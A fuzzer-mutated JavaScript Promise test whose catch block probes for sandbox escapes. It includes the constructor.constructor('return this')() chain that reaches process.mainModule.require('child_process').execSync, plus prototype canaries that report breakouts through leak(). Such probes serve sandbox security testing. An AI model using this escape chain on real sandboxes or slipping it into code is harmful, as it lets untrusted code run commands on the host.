try {
    var promise = new Promise(function (_, reject) {
        let REPLACER = 23;
        reject();
    });
    var fulfilledCallCount = 0;
    var rejectedCallCount = 0;
    promise.then(function () {
        let REPLACER = 23;
        fulfilledCallCount += 1;
    }, function () {
        let REPLACER = 23;
        rejectedCallCount += 1;
        throw new Error();
    });
    promise.then(function () {
        throw () => {
            return () => {
            };
        };
        $DONE('This promise should not be fulfilled.');
    }, function () {
        if (fulfilledCallCount !== 0) {
            $DONE('Expected "onFulfilled" handler to not be invoked.');
            return;
        }
        if (rejectedCallCount !== 1) {
            $DONE('Expected "onRejected" handler to be invoked exactly once.');
            return;
        }
        $DONE();
    });
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}